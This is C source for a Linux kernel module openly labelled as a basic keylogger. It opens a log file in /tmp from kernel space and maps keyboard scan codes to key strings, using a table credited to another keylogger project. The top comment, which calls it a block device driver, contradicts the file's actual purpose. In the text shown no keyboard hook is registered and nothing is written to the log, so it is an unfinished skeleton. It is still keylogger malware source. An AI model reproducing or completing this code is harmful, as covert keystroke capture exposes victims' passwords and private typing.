/*
 *    PURPOSE - A block device driver for a virtual block device of my own creation
 */

/////////////
/* HEADERS */
/////////////
// Do not change the order of these includes unless you want:
// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
#include <asm/current.h>                        // current
#include <linux/cred.h>                         // ???

#include <asm/uaccess.h>                        // get_fs(), set_fs()
#include "HarkleKerror.h"                       // Kernel error macros
#include <linux/fcntl.h>                        // filp_open(), filp_close()
#include <linux/fs.h>                           // Defines file table structures
#include <linux/kernel.h>                       // ALWAYS NEED
#include <linux/module.h>                       // ALWAYS NEED
#include <linux/stat.h>                         // File mode macros

////////////
/* MACROS */
////////////
#define DEVICE_NAME "My Key Logger"            // Use this macro for logging
// #define HARKLE_KERROR(module, funcName, errMsg) do { printk(KERN_ERR "%s: <<<ERROR>>> %s - %s\n", module, #funcName, errMsg); } while (0);
// #define HARKLE_KERRNO(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
// #define HARKLE_KINFO(module, msg) do { printk(KERN_INFO "%s: %s\n", module, msg); } while (0);
#define BUFF_SIZE 16                           // Size of the out buffer
#ifndef TRUE
#define TRUE 1
#endif  // TRUE
#ifndef FALSE
#define FALSE 0
#endif  // FALSE
#define DEF_LOG_FILENAME "/tmp/myKeyLog.txt"
#define DEF_LOG_FLAGS O_WRONLY | O_CREAT | O_APPEND
// #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
#define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH

//////////////
/* TYPEDEFS */
//////////////
typedef struct _myKeyLogger
{
    struct file *log_fp;
    loff_t logOffset;
    char keyStr[BUFF_SIZE + 1];
} myKeyLogger, *myKeyLogger_ptr;

/////////////////////////
/* FUNCTION PROTOTYPES */
/////////////////////////
// PURPOSE - LKM init function
static int __init key_logger_init(void);
// PURPOSE - LKM exit function
static void __exit key_logger_exit(void);
// PURPOSE - Return a file pointer to fileName_ptr with given flags and permissions
static struct file* open_log(const char *fileName_ptr, int flags, int rights);
// PURPOSE - Close a file pointer
static void close_log(struct file *logFile_fp);
// PURPOSE - Translate scan code to 'key' string
// RETURN - 0 on success, -1 on failure
static int translate_code(unsigned char scanCode, char *buf);

/////////////
/* GLOBALS */
/////////////
myKeyLogger myKL;
int shift;
// struct task_struct;

//////////////////////////
/* FUNCTION DEFINITIONS */
//////////////////////////
static int __init key_logger_init(void)
{
    int retVal = 0;
    // unsigned char i = 0;  // DEBUGGING
    
    HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING

    // Initialize Globals
    // 1. Initialize myKeyLogger struct
    myKL.log_fp = NULL;
    myKL.logOffset = 0;
    memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
    // 2. shift
    shift = FALSE;

    // DEBUGGING
    // for (i = 0; i <= 85; i++)
    // {
    //     translate_code(i, myKL.keyStr);
    // }

    // Prepare Key Logging File
    myKL.log_fp = open_log(DEF_LOG_FILENAME, DEF_LOG_FLAGS, DEF_LOG_PERMS);

    if (!(myKL.log_fp))
    {
        retVal = -1;
        HARKLE_KERROR(DEVICE_NAME, key_logger_init, "open_log() Failed");  // DEBUGGING
    }
    
    else
    {
        HARKLE_KINFO(DEVICE_NAME, "File opened");  // DEBUGGING

        // NOTE: Getting errors here.  Work on making the logger append to the file later.
        // http://www.ouah.org/mammon_kernel-mode_read_hack.txt
        // myKL.logOffset = myKL.log_fp->f_pos;
        // printk(KERN_INFO "%s: File offset of %s is %ld\n", DEVICE_NAME, DEF_LOG_FILENAME, myKL.logOffset);  // DEBUGGING
    }
    
    // DONE
    HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
    return retVal;
}

static void __exit key_logger_exit(void)
{
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
    // Close Key Logging File
    if (myKL.log_fp)
    {
        close_log(myKL.log_fp);
        myKL.log_fp = NULL;
        HARKLE_KINFO(DEVICE_NAME, "File closed");  // DEBUGGING
    }
    else
    {
        HARKLE_KWARNG(DEVICE_NAME, key_logger_exit, "Logging file pointer was NULL");  // DEBUGGING
    }
    
    // DONE
    HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
    return;
}

static struct file* open_log(const char *fileName_ptr, int flags, int rights)
{
    struct file *retVal = NULL;
    mm_segment_t old_fs = get_fs();  // Store the original process address space specification

    // INPUT VALIDATION
    if (!fileName_ptr)
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "NULL Pointer");  // DEBUGGING
    }
    else if (!(*fileName_ptr))
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "Empty string");  // DEBUGGING
    }
    else if (O_RDONLY != flags && !(flags & (O_WRONLY | O_RDWR)))
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid flags");  // DEBUGGING
    }
    else if (!rights)
    {
        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid permissions");  // DEBUGGING
    }
    else
    {
        // OPEN FILE
        // 1. Change to kernel process address space
        // set_fs(KERNEL_DS);  // I've seen this but...
        set_fs(get_ds());  // ...the majority wins

        // 2. Open the file
        retVal = filp_open(fileName_ptr, flags, rights);

        // 3. Restore the address specification (regardless of success)
        set_fs(old_fs);

        if (IS_ERR(retVal))
        {
            HARKLE_KERRNO(DEVICE_NAME, open_log, (int)PTR_ERR(retVal));
            retVal = NULL;
        }
    }

    return retVal;
}

static void close_log(struct file *logFile_fp)
{
    if (logFile_fp)
    {
        filp_close(logFile_fp, NULL);
    }

    return;
}

static int translate_code(unsigned char scanCode, char *buf)
{
    int retVal = 0;
    char *tempRetVal = NULL;

    if (buf)
    {
        // 1. Zeroize the buffer
        memset(buf, 0x0, BUFF_SIZE);

        // 2. Translate and copy in the string
        // This switch statement was lifted from:
        // https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c
        switch(scanCode)
        {
            case 0:
                tempRetVal = buf; break;
            case 1:
                tempRetVal = strncpy(buf, "(ESC)", BUFF_SIZE); break;
            case 2:
                tempRetVal = strncpy(buf, (shift) ? "!" : "1", BUFF_SIZE); break;
            case 3:
                tempRetVal = strncpy(buf, (shift) ? "@" : "2", BUFF_SIZE); break;
            case 4:
                tempRetVal = strncpy(buf, (shift) ? "#" : "3", BUFF_SIZE); break;
            case 5:
                tempRetVal = strncpy(buf, (shift) ? "$" : "4", BUFF_SIZE); break;
            case 6:
                tempRetVal = strncpy(buf, (shift) ? "%" : "5", BUFF_SIZE); break;
            case 7:
                tempRetVal = strncpy(buf, (shift) ? "^" : "6", BUFF_SIZE); break;
            case 8:
                tempRetVal = strncpy(buf, (shift) ? "&" : "7", BUFF_SIZE); break;
            case 9:
                tempRetVal = strncpy(buf, (shift) ? "*" : "8", BUFF_SIZE); break;
            case 10:
                tempRetVal = strncpy(buf, (shift) ? "(" : "9", BUFF_SIZE); break;
            case 11:
                tempRetVal = strncpy(buf, (shift) ? ")" : "0", BUFF_SIZE); break;
            case 12:
                tempRetVal = strncpy(buf, (shift) ? "_" : "-", BUFF_SIZE); break;
            case 13:
                tempRetVal = strncpy(buf, (shift) ? "+" : "=", BUFF_SIZE); break;
            case 14:
                tempRetVal = strncpy(buf, "(BACK)", BUFF_SIZE); break;
            case 15:
                tempRetVal = strncpy(buf, "(TAB)", BUFF_SIZE); break;
            case 16:
                tempRetVal = strncpy(buf, (shift) ? "Q" : "q", BUFF_SIZE); break;
            case 17:
                tempRetVal = strncpy(buf, (shift) ? "W" : "w", BUFF_SIZE); break;
            case 18:
                tempRetVal = strncpy(buf, (shift) ? "E" : "e", BUFF_SIZE); break;
            case 19:
                tempRetVal = strncpy(buf, (shift) ? "R" : "r", BUFF_SIZE); break;
            case 20:
                tempRetVal = strncpy(buf, (shift) ? "T" : "t", BUFF_SIZE); break;
            case 21:
                tempRetVal = strncpy(buf, (shift) ? "Y" : "y", BUFF_SIZE); break;
            case 22:
                tempRetVal = strncpy(buf, (shift) ? "U" : "u", BUFF_SIZE); break;
            case 23:
                tempRetVal = strncpy(buf, (shift) ? "I" : "i", BUFF_SIZE); break;
            case 24:
                tempRetVal = strncpy(buf, (shift) ? "O" : "o", BUFF_SIZE); break;
            case 25:
                tempRetVal = strncpy(buf, (shift) ? "P" : "p", BUFF_SIZE); break;
            case 26:
                tempRetVal = strncpy(buf, (shift) ? "{" : "[", BUFF_SIZE); break;
            case 27:
                tempRetVal = strncpy(buf, (shift) ? "}" : "]", BUFF_SIZE); break;
            case 28:
                tempRetVal = strncpy(buf, "(ENTER)", BUFF_SIZE); break;
            case 29:
                tempRetVal = strncpy(buf, "(CTRL)", BUFF_SIZE); break;
            case 30:
                tempRetVal = strncpy(buf, (shift) ? "A" : "a", BUFF_SIZE); break;
            case 31:
                tempRetVal = strncpy(buf, (shift) ? "S" : "s", BUFF_SIZE); break;
            case 32:
                tempRetVal = strncpy(buf, (shift) ? "D" : "d", BUFF_SIZE); break;
            case 33:
                tempRetVal = strncpy(buf, (shift) ? "F" : "f", BUFF_SIZE); break;
            case 34:
                tempRetVal = strncpy(buf, (shift) ? "G" : "g", BUFF_SIZE); break;
            case 35:
                tempRetVal = strncpy(buf, (shift) ? "H" : "h", BUFF_SIZE); break;
            case 36:
                tempRetVal = strncpy(buf, (shift) ? "J" : "j", BUFF_SIZE); break;
            case 37:
                tempRetVal = strncpy(buf, (shift) ? "K" : "k", BUFF_SIZE); break;
            case 38:
                tempRetVal = strncpy(buf, (shift) ? "L" : "l", BUFF_SIZE); break;
            case 39:
                tempRetVal = strncpy(buf, (shift) ? ":" : ";", BUFF_SIZE); break;
            case 40:
                tempRetVal = strncpy(buf, (shift) ? "\"" : "'", BUFF_SIZE); break;
            case 41:
                tempRetVal = strncpy(buf, (shift) ? "~" : "`", BUFF_SIZE); break;
            case 42:
            case 54:
                shift = 1; tempRetVal = buf; break;
            case 170:
            case 182:
                shift = 0; tempRetVal = buf; break;
            case 43:
                tempRetVal = strncpy(buf, (shift) ? "\\" : "|", BUFF_SIZE); break;
            case 44:
                tempRetVal = strncpy(buf, (shift) ? "Z" : "z", BUFF_SIZE); break;
            case 45:
                tempRetVal = strncpy(buf, (shift) ? "X" : "x", BUFF_SIZE); break;
            case 46:
                tempRetVal = strncpy(buf, (shift) ? "C" : "c", BUFF_SIZE); break;
            case 47:
                tempRetVal = strncpy(buf, (shift) ? "V" : "v", BUFF_SIZE); break;
            case 48:
                tempRetVal = strncpy(buf, (shift) ? "B" : "b", BUFF_SIZE); break;
            case 49:
                tempRetVal = strncpy(buf, (shift) ? "N" : "n", BUFF_SIZE); break;
            case 50:
                tempRetVal = strncpy(buf, (shift) ? "M" : "m", BUFF_SIZE); break;
            case 51:
                tempRetVal = strncpy(buf, (shift) ? "<" : ",", BUFF_SIZE); break;
            case 52:
                tempRetVal = strncpy(buf, (shift) ? ">" : ".", BUFF_SIZE); break;
            case 53:
                tempRetVal = strncpy(buf, (shift) ? "?" : "/", BUFF_SIZE); break;
            case 56:
                tempRetVal = strncpy(buf, "(R-ALT)", BUFF_SIZE); break;
            case 69:
                tempRetVal = strncpy(buf, "(NUM)", BUFF_SIZE); break;
            /* Space */
            case 55:
            case 57:
            case 58:
            case 59:
            case 60:
            case 61:
            case 62:
            case 63:
            case 64:
            case 65:
            case 66:
            case 67:
            case 68:
            case 70:
            case 71:
            case 72:
                tempRetVal = strncpy(buf, " ", BUFF_SIZE); break;
            case 73:
                tempRetVal = strncpy(buf, "(PGUP)", BUFF_SIZE); break;
            case 74:
                tempRetVal = strncpy(buf, "-", BUFF_SIZE); break;
            case 75:
                tempRetVal = strncpy(buf, "(LEFT)", BUFF_SIZE); break;
            case 76:
                tempRetVal = strncpy(buf, "(KPD5)", BUFF_SIZE); break;
            case 77:
                tempRetVal = strncpy(buf, "(RIGHT)", BUFF_SIZE); break;
            case 78:
                tempRetVal = strncpy(buf, "+", BUFF_SIZE); break;
            case 79:
                tempRetVal = strncpy(buf, "(END)", BUFF_SIZE); break;
            case 80:
                tempRetVal = strncpy(buf, "(DOWN)", BUFF_SIZE); break;
            case 81:
                tempRetVal = strncpy(buf, "(PGDN)", BUFF_SIZE); break;
            case 82:
                tempRetVal = strncpy(buf, "(INS)", BUFF_SIZE); break;
            case 83:
                tempRetVal = strncpy(buf, "(DEL)", BUFF_SIZE); break;
            case 84:
                tempRetVal = strncpy(buf, "(SYSRQ)", BUFF_SIZE); break;
            default:
                printk(KERN_INFO "%s: translate_code() received unsupported scan code of %u.\n", DEVICE_NAME, scanCode);  // DEBUGGING
                tempRetVal = buf;
                break;
        }

        if (tempRetVal != buf || NULL == tempRetVal)
        {
            retVal = -1;
        }
        else if (*tempRetVal)
        {
            printk(KERN_INFO "%s: Translated %u into '%s'\n", DEVICE_NAME, scanCode, buf);  // DEBUGGING
        }
    }
    else
    {
        HARKLE_KERROR(DEVICE_NAME, translate_code, "NULL pointer");  // DEBUGGING
    }

    return retVal;
}

module_init(key_logger_init);
module_exit(key_logger_exit);

////////////////////////
/* DRIVER INFORMATION */
////////////////////////
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
MODULE_VERSION("0.1"); // Not yet releasable
